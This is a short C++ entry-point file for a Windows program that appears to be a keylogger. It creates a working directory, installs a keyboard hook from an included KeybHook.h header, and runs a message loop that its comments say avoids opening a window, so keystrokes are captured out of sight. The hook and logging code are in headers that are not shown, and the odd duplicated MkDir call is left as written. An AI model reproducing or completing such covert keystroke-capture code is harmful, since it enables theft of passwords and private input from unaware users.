#include <iostream>
#include <windows.h>
#include "KeyConstants.h"
#include "Helper.h"
#include "IO.h"
#include "KeybHook.h"
#include <stdio.h>
using namespace std;

int main()
{
    MSG Msg;
    //IO::MkDir(IO::GetOurPath(true));
    IO::MKDir(IO::GetOurPath(true));
    InstallHook();
    /* This is to avoid opening a window */
    while (GetMessage(&Msg, NULL, 0, 0))
    {
       TranslateMessage(&Msg);
       DispatchMessage(&Msg);
    }
    /* This is to avoid opening a window */
    return 0;
}
